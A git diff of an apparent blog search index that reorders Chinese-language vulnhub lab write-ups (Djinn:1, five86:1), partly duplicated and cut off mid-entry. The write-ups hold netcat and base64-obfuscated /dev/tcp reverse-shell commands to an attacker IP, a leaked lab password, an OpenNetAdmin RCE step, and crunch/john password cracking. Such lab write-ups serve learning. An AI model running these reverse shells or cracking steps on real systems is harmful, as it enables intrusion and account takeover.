@@ -289,6 +289,127 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub Djinn:1靶机</title>
+    <url>//Djinn-1.html</url>
+    <content><![CDATA[<p>vulnhub里的 Djinn:1 靶机</p>
+<p>中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn:1"></a>Djinn:1</h1><img src="./Djinn:1/image-20200718152057202.png" alt="image-20200718152057202" style="zoom:25%;" />
+
+<p>扫描之后发现开启了 <code>21,22,1337,7331</code>四个端口</p>
+<p>其中 ssh 处于 <code>filtered</code> 状态</p>
+<h2 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h2><p>是一个小游戏</p>
+<img src="Djinn:1/image-20200718152159308.png" alt="image-20200718152159308" style="zoom:25%;" />
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.2.170&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;gift.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">arg1, arg2, case</span>):</span></span><br><span class="line">	<span class="keyword">if</span> (case == <span class="string">&quot;+&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 + arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;-&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 - arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;*&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 * arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;/&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 / arg2</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		print(<span class="string">&quot;case: &quot;</span>, case)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">	arg1 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">	case = sh.recv(<span class="number">1</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	arg2 = <span class="built_in">float</span>(sh.recvuntil(<span class="string">&quot;)&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	ans = function(arg1, arg2, case)</span><br><span class="line">	<span class="comment">#print(&quot;ans: &quot;, ans)</span></span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">	</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>pwntools</code>编写exp，得到结果</p>
+<img src="Djinn:1/image-20200718152949625.png" alt="image-20200718152949625" style="zoom:25%;" />
+
+<p>我猜是端口敲门服务，但是并不是，敲了门之后ssh反而close了（会不会是我敲门的操作不对）</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>观察到ftp端口扫描的结果，直接出现了文件的名字，并且允许匿名登陆。</p>
+<img src="Djinn:1/image-20200718153356511.png" alt="image-20200718153356511" style="zoom:25%;" />
+
+<p>匿名登陆之后，下载三个文件看看</p>
+<img src="Djinn:1/image-20200718153542804.png" alt="image-20200718153542804" style="zoom:25%;" />
+
+
+
+<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>是一个http端口</p>
+<img src="Djinn:1/image-20200718153726596.png" alt="image-20200718153726596" style="zoom:25%;" />
+
+<p>扫描一下，得到两个目录<code>/wish</code>和<code> /genie</code></p>
+<img src="Djinn:1/image-20200718173347887.png" alt="image-20200718173347887" style="zoom:25%;" />
+
+<p>输入ls，得到的页面出现了目录列表</p>
+<img src="Djinn:1/image-20200718173841552.png" alt="image-20200718173841552" style="zoom:25%;" />
+
+<img src="Djinn:1/image-20200718173851608.png" alt="image-20200718173851608" style="zoom:25%;" />
+
+<p>试试弹一个webshell</p>
+<p><code>nc -e /bin/bash 192.168.2.143 8848</code></p>
+<img src="Djinn:1/image-20200718173946396.png" alt="image-20200718173946396" style="zoom:25%;" />
+
+<p>应该是做了过滤，不懂怎么绕过</p>
+<p>（翻参考答案去了）</p>
+<h2 id="使用base64绕过"><a href="#使用base64绕过" class="headerlink" title="使用base64绕过"></a>使用base64绕过</h2><img src="Djinn:1/image-20200718191903547.png" alt="image-20200718191903547" style="zoom:25%;" />
+
+
+
+<p>然后在execute里面输入<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTQzLzg4NDggMD4mMQ== | base64 -d | bash</code> 即可得到一个反弹shell</p>
+<img src="Djinn:1/image-20200718192017136.png" alt="image-20200718192017136" style="zoom:25%;" />
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看一下<code>/home</code></p>
+<img src="Djinn:1/image-20200718192113475.png" alt="image-20200718192113475" style="zoom:25%;" />
+
+<p>发现<code>nitush</code>是可以读的，下面有一个<code>user.txt</code>，但是读不了，只有<code>.dev(目录)</code> 和<code>.bashrc(文件)</code>是可以读的，看一下<code>.dev</code>里面有啥</p>
+<img src="Djinn:1/image-20200718192411442.png" alt="image-20200718192411442" style="zoom:25%;" />
+
+<p>发现有一个可以读取的文件<code>creds.txt</code>，读取一下</p>
+<img src="Djinn:1/image-20200718192503004.png" alt="image-20200718192503004" style="zoom:25%;" />
+
+<p>得到了nitish的密码<code>p4ssw0rdStr3r0n9</code>，切换到nitish</p>
+<img src="Djinn:1/image-20200718192549436.png" alt="image-20200718192549436" style="zoom:25%;" />
+
+<p>需要提升shell，用python的pty即可</p>
+<img src="Djinn:1/image-20200718192650192.png" alt="image-20200718192650192" style="zoom:25%;" />
+
+<p>读取<code>user.txt</code>发现没有啥用（应该是flag中的一个）</p>
+<p>看一下能用于提权的东西</p>
+<img src="Djinn:1/image-20200718192802095.png" alt="image-20200718192802095" style="zoom:25%;" />
+
+<p><code>genie</code>是啥，man 看一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">还有一个 -cmd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>按照他的说法，可以使用 <code>-p &quot;/bin/bash&quot;</code>，发现并没有卵用？</p>
+<p>还说可以<code>-e exec</code>试试看<code>-e /bin/bash</code></p>
+<img src="Djinn:1/image-20200718193412986.png" alt="image-20200718193412986" style="zoom:25%;" />
+
+<p>再试试<code>-cmd</code></p>
+<img src="Djinn:1/image-20200718193604801.png" alt="image-20200718193604801" style="zoom:25%;" />
+
+<p>发现确实可以了</p>
+<p>再看看能提权的东西</p>
+<img src="Djinn:1/image-20200718193651732.png" alt="image-20200718193651732" style="zoom:25%;" />
+
+<p>运行一下看看</p>
+<img src="Djinn:1/image-20200718193739836.png" alt="image-20200718193739836" style="zoom:25%;" />
+
+<p>（又去翻参考答案了）</p>
+<p>说是<code>~/.pyc</code>文件就是这个文件的原型（想不到啊想不到，但是为啥呢）</p>
+<img src="Djinn:1/image-20200718194118697.png" alt="image-20200718194118697" style="zoom:25%;" />
+
+<p>（这些字符有些是出现在刚刚的程序里面的）</p>
+<p>.pyc文件找一个在线网站反编译python就行</p>
+<img src="Djinn:1/image-20200718194246226.png" alt="image-20200718194246226" style="zoom:25%;" />
+
+<p>要么有1/100的概率中，要么就是<a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">python2 <code>input</code>函数存在的一个漏洞</a></p>
+<p>所以输入num就能通过验证</p>
+<img src="Djinn:1/image-20200718194457671.png" alt="image-20200718194457671" style="zoom:25%;" />
+
+
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>Djinn</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>ftp</tag>
+        <tag>command-injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub DC-8靶机</title>
     <url>//DC-9.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
@@ -408,127 +529,6 @@
         <tag>exploit</tag>
         <tag>sql-injection</tag>
         <tag>file-including</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub Djinn:1靶机</title>
-    <url>//Djinn-1.html</url>
-    <content><![CDATA[<p>vulnhub里的 Djinn:1 靶机</p>
-<p>中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn:1"></a>Djinn:1</h1><img src="./Djinn:1/image-20200718152057202.png" alt="image-20200718152057202" style="zoom:25%;" />
-
-<p>扫描之后发现开启了 <code>21,22,1337,7331</code>四个端口</p>
-<p>其中 ssh 处于 <code>filtered</code> 状态</p>
-<h2 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h2><p>是一个小游戏</p>
-<img src="Djinn:1/image-20200718152159308.png" alt="image-20200718152159308" style="zoom:25%;" />
-
-
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.2.170&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;gift.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">arg1, arg2, case</span>):</span></span><br><span class="line">	<span class="keyword">if</span> (case == <span class="string">&quot;+&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 + arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;-&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 - arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;*&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 * arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;/&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 / arg2</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		print(<span class="string">&quot;case: &quot;</span>, case)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">	arg1 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">	case = sh.recv(<span class="number">1</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	arg2 = <span class="built_in">float</span>(sh.recvuntil(<span class="string">&quot;)&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	ans = function(arg1, arg2, case)</span><br><span class="line">	<span class="comment">#print(&quot;ans: &quot;, ans)</span></span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">	</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>pwntools</code>编写exp，得到结果</p>
-<img src="Djinn:1/image-20200718152949625.png" alt="image-20200718152949625" style="zoom:25%;" />
-
-<p>我猜是端口敲门服务，但是并不是，敲了门之后ssh反而close了（会不会是我敲门的操作不对）</p>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>观察到ftp端口扫描的结果，直接出现了文件的名字，并且允许匿名登陆。</p>
-<img src="Djinn:1/image-20200718153356511.png" alt="image-20200718153356511" style="zoom:25%;" />
-
-<p>匿名登陆之后，下载三个文件看看</p>
-<img src="Djinn:1/image-20200718153542804.png" alt="image-20200718153542804" style="zoom:25%;" />
-
-
-
-<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>是一个http端口</p>
-<img src="Djinn:1/image-20200718153726596.png" alt="image-20200718153726596" style="zoom:25%;" />
-
-<p>扫描一下，得到两个目录<code>/wish</code>和<code> /genie</code></p>
-<img src="Djinn:1/image-20200718173347887.png" alt="image-20200718173347887" style="zoom:25%;" />
-
-<p>输入ls，得到的页面出现了目录列表</p>
-<img src="Djinn:1/image-20200718173841552.png" alt="image-20200718173841552" style="zoom:25%;" />
-
-<img src="Djinn:1/image-20200718173851608.png" alt="image-20200718173851608" style="zoom:25%;" />
-
-<p>试试弹一个webshell</p>
-<p><code>nc -e /bin/bash 192.168.2.143 8848</code></p>
-<img src="Djinn:1/image-20200718173946396.png" alt="image-20200718173946396" style="zoom:25%;" />
-
-<p>应该是做了过滤，不懂怎么绕过</p>
-<p>（翻参考答案去了）</p>
-<h2 id="使用base64绕过"><a href="#使用base64绕过" class="headerlink" title="使用base64绕过"></a>使用base64绕过</h2><img src="Djinn:1/image-20200718191903547.png" alt="image-20200718191903547" style="zoom:25%;" />
-
-
-
-<p>然后在execute里面输入<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTQzLzg4NDggMD4mMQ== | base64 -d | bash</code> 即可得到一个反弹shell</p>
-<img src="Djinn:1/image-20200718192017136.png" alt="image-20200718192017136" style="zoom:25%;" />
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看一下<code>/home</code></p>
-<img src="Djinn:1/image-20200718192113475.png" alt="image-20200718192113475" style="zoom:25%;" />
-
-<p>发现<code>nitush</code>是可以读的，下面有一个<code>user.txt</code>，但是读不了，只有<code>.dev(目录)</code> 和<code>.bashrc(文件)</code>是可以读的，看一下<code>.dev</code>里面有啥</p>
-<img src="Djinn:1/image-20200718192411442.png" alt="image-20200718192411442" style="zoom:25%;" />
-
-<p>发现有一个可以读取的文件<code>creds.txt</code>，读取一下</p>
-<img src="Djinn:1/image-20200718192503004.png" alt="image-20200718192503004" style="zoom:25%;" />
-
-<p>得到了nitish的密码<code>p4ssw0rdStr3r0n9</code>，切换到nitish</p>
-<img src="Djinn:1/image-20200718192549436.png" alt="image-20200718192549436" style="zoom:25%;" />
-
-<p>需要提升shell，用python的pty即可</p>
-<img src="Djinn:1/image-20200718192650192.png" alt="image-20200718192650192" style="zoom:25%;" />
-
-<p>读取<code>user.txt</code>发现没有啥用（应该是flag中的一个）</p>
-<p>看一下能用于提权的东西</p>
-<img src="Djinn:1/image-20200718192802095.png" alt="image-20200718192802095" style="zoom:25%;" />
-
-<p><code>genie</code>是啥，man 看一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">genie [-h] [-g] [-p SHELL] [-e EXEC] wish</span><br><span class="line">还有一个 -cmd</span><br></pre></td></tr></table></figure>
-
-
-
-<p>按照他的说法，可以使用 <code>-p &quot;/bin/bash&quot;</code>，发现并没有卵用？</p>
-<p>还说可以<code>-e exec</code>试试看<code>-e /bin/bash</code></p>
-<img src="Djinn:1/image-20200718193412986.png" alt="image-20200718193412986" style="zoom:25%;" />
-
-<p>再试试<code>-cmd</code></p>
-<img src="Djinn:1/image-20200718193604801.png" alt="image-20200718193604801" style="zoom:25%;" />
-
-<p>发现确实可以了</p>
-<p>再看看能提权的东西</p>
-<img src="Djinn:1/image-20200718193651732.png" alt="image-20200718193651732" style="zoom:25%;" />
-
-<p>运行一下看看</p>
-<img src="Djinn:1/image-20200718193739836.png" alt="image-20200718193739836" style="zoom:25%;" />
-
-<p>（又去翻参考答案了）</p>
-<p>说是<code>~/.pyc</code>文件就是这个文件的原型（想不到啊想不到，但是为啥呢）</p>
-<img src="Djinn:1/image-20200718194118697.png" alt="image-20200718194118697" style="zoom:25%;" />
-
-<p>（这些字符有些是出现在刚刚的程序里面的）</p>
-<p>.pyc文件找一个在线网站反编译python就行</p>
-<img src="Djinn:1/image-20200718194246226.png" alt="image-20200718194246226" style="zoom:25%;" />
-
-<p>要么有1/100的概率中，要么就是<a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">python2 <code>input</code>函数存在的一个漏洞</a></p>
-<p>所以输入num就能通过验证</p>
-<img src="Djinn:1/image-20200718194457671.png" alt="image-20200718194457671" style="zoom:25%;" />
-
-
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>Djinn</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>ftp</tag>
-        <tag>command-injection</tag>
       </tags>
   </entry>
   <entry>
@@ -740,94 +740,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub five86:1靶机</title>
-    <url>//five86-1.html</url>
-    <content><![CDATA[<p>vulnhub里的 five86:1 靶机</p>
-<p>简单/中等难度</p>
-<a id="more"></a>
-
-<h1 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86:1"></a>Five86:1</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.163</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn -A 192.168.2.163 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/ona</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; Charset=iso-8859-1).</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><p>看到<code>webadmin</code>以为稳了，拿出熟悉的脚本，发现并不行了</p>
-<img src="five86:1/image-20200710152751273.png" alt="image-20200710152751273" style="zoom:50%;" />
-
-<p>这里看样子不行</p>
-<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问网页发现啥也没有</p>
-<img src="five86:1/image-20200710152841189.png" alt="image-20200710152841189" style="zoom:50%;" />
-
-<p>想到有一个<code>robots.txt</code>，打开一看</p>
-<img src="five86:1/image-20200710152903806.png" alt="image-20200710152903806" style="zoom:50%;" />
-
-<p>有一个<code>/ona</code>，访问一下看看</p>
-<img src="five86:1/image-20200710152930660.png" alt="image-20200710152930660" style="zoom:50%;" />
-
-<p>是一个<code>opennetadmin</code>，使用<code>searchexplot</code> 看看有没有现成的exp</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# searchsploit opennetadmin</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                       |  Path</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution        | php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Met | php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution          | php/webapps/47691.sh</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
-
-<p>拿最新版<code>remote code execution</code>试试</p>
-<img src="five86:1/image-20200710153128235.png" alt="image-20200710153128235" style="zoom:50%;" />
-
-<p>拿到了一个webshell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找一下有没有<code>setuid</code>的东西</p>
-<img src="five86:1/image-20200710153207499.png" alt="image-20200710153207499" style="zoom:50%;" />
-
-<p>看到<code>exim4</code>，以为又稳了，准备拿出<code>46996.sh</code>来直接攻击，发现连<code>/tmp</code>目录都不能写</p>
-<p>找一下<code>www-data</code>能访问的文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find / -<span class="built_in">type</span> f -user www-data</span></span><br><span class="line">/var/www/html/reports/.htaccess</span><br><span class="line">/var/log/ona.log</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<p>看一下<code>.htaccess</code>文件</p>
-<img src="five86:1/image-20200710153411287.png" alt="image-20200710153411287" style="zoom:50%;" />
-
-<p>再看一下<code>/var/www/.htpasswd</code></p>
-<img src="five86:1/image-20200710153435351.png" alt="image-20200710153435351" style="zoom:50%;" />
-
-<p>给了提示，使用<code>aefhrt</code>生成10个字符的密码本</p>
-<p>使用<code>crunch</code> 工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# crunch 10 10 aefhrt &gt; 1.txt</span><br><span class="line">Crunch will now generate the following amount of data: 665127936 bytes</span><br><span class="line">634 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 60466176 </span><br></pre></td></tr></table></figure>
-
-<p>然后使用<code>john</code> 爆破</p>
-<img src="five86:1/image-20200710153640169.png" alt="image-20200710153640169" style="zoom:50%;" />
-
-
-
-<p>ssh连接上去，找一下可以提权的玩意</p>
-<img src="five86:1/image-20200710153724798.png" alt="image-20200710153724798" style="zoom:50%;" />
-
-<p>发现可以不用密码 以 jen 的身份运行 <code>/bin/cp</code>，那就把<code>ssh密钥</code>给它拷贝到jen里面，实现用户切换</p>
-<img src="five86:1/image-20200710153836025.png" alt="image-20200710153836025" style="zoom:50%;" />
-
-<p>ssh连接到jen账户</p>
-<p>提示在<code>/var/mail/jen</code>下有一封邮件</p>
-<img src="five86:1/image-20200710154036607.png" alt="image-20200710154036607" style="zoom: 33%;" />
-
-
-
-<p>得到了<code>moss</code>的密码，切换到 moss用户</p>
-<p>发现其目录下有一个有<code>setuid</code>权限的<code>root</code>账户的程序</p>
-<img src="five86:1/image-20200710154142971.png" alt="image-20200710154142971" style="zoom:50%;" />
-
-<p>运行之后，不论输入啥，都可以得到root权限</p>
-<img src="five86:1/image-20200710154217425.png" alt="image-20200710154217425" style="zoom:50%;" />
-
-
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>opennetadmin</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub five86:2靶机</title>
     <url>//five86-2.html</url>
     <content><![CDATA[<p>vulnhub里的 five86:2 靶机</p>
@@ -925,6 +837,94 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub five86:1靶机</title>
+    <url>//five86-1.html</url>
+    <content><![CDATA[<p>vulnhub里的 five86:1 靶机</p>
+<p>简单/中等难度</p>
+<a id="more"></a>
+
+<h1 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86:1"></a>Five86:1</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.163</span><br><span class="line">Host is up (0.00068s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn -A 192.168.2.163 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/ona</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; Charset=iso-8859-1).</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a>webadmin</h2><p>看到<code>webadmin</code>以为稳了，拿出熟悉的脚本，发现并不行了</p>
+<img src="five86:1/image-20200710152751273.png" alt="image-20200710152751273" style="zoom:50%;" />
+
+<p>这里看样子不行</p>
+<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问网页发现啥也没有</p>
+<img src="five86:1/image-20200710152841189.png" alt="image-20200710152841189" style="zoom:50%;" />
+
+<p>想到有一个<code>robots.txt</code>，打开一看</p>
+<img src="five86:1/image-20200710152903806.png" alt="image-20200710152903806" style="zoom:50%;" />
+
+<p>有一个<code>/ona</code>，访问一下看看</p>
+<img src="five86:1/image-20200710152930660.png" alt="image-20200710152930660" style="zoom:50%;" />
+
+<p>是一个<code>opennetadmin</code>，使用<code>searchexplot</code> 看看有没有现成的exp</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# searchsploit opennetadmin</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                       |  Path</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution        | php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Met | php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution          | php/webapps/47691.sh</span><br><span class="line">----------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>拿最新版<code>remote code execution</code>试试</p>
+<img src="five86:1/image-20200710153128235.png" alt="image-20200710153128235" style="zoom:50%;" />
+
+<p>拿到了一个webshell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>找一下有没有<code>setuid</code>的东西</p>
+<img src="five86:1/image-20200710153207499.png" alt="image-20200710153207499" style="zoom:50%;" />
+
+<p>看到<code>exim4</code>，以为又稳了，准备拿出<code>46996.sh</code>来直接攻击，发现连<code>/tmp</code>目录都不能写</p>
+<p>找一下<code>www-data</code>能访问的文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find / -<span class="built_in">type</span> f -user www-data</span></span><br><span class="line">/var/www/html/reports/.htaccess</span><br><span class="line">/var/log/ona.log</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>看一下<code>.htaccess</code>文件</p>
+<img src="five86:1/image-20200710153411287.png" alt="image-20200710153411287" style="zoom:50%;" />
+
+<p>再看一下<code>/var/www/.htpasswd</code></p>
+<img src="five86:1/image-20200710153435351.png" alt="image-20200710153435351" style="zoom:50%;" />
+
+<p>给了提示，使用<code>aefhrt</code>生成10个字符的密码本</p>
+<p>使用<code>crunch</code> 工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# crunch 10 10 aefhrt &gt; 1.txt</span><br><span class="line">Crunch will now generate the following amount of data: 665127936 bytes</span><br><span class="line">634 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 60466176 </span><br></pre></td></tr></table></figure>
+
+<p>然后使用<code>john</code> 爆破</p>
+<img src="five86:1/image-20200710153640169.png" alt="image-20200710153640169" style="zoom:50%;" />
+
+
+
+<p>ssh连接上去，找一下可以提权的玩意</p>
